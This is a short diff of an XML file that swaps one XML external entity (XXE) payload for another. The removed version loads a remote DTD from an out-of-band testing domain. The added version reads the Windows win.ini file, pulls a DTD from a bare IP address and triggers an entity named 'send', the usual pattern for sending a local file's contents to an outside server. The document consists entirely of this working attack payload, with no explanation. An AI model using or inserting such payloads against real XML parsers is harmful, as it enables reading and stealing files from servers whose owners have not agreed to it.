@@ -1,6 +1,6 @@
-<?xml version="1.0" ?>
-<!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "https://111.xklj9atj14ebttsxcjyro2hef5lw9qxf.oastify.com/ext.dtd">
-    %ext;
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+  <!ENTITY % dtd SYSTEM "http://137.184.35.253:80/data.dtd"> %dtd;
 ]>
-<message></message>
+<data>&send;</data>
